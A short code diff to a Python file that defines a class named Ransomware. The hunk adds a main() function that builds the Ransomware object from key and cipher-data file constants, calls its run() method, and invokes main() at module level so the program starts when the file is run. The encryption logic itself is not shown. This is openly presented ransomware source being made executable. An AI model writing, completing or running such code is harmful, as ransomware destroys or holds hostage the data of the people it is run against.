@@ -74,9 +74,8 @@ class Ransomware:
             print(f"Error: {e}")
             return
 
-
-
-
-
-
 def main():
+    ransomware = Ransomware(KEY_FILE, CIPHER_KEY_FILE, SECRET_FILE, CIPER_DATA_FILE)
+    ransomware.run()
+
+main()
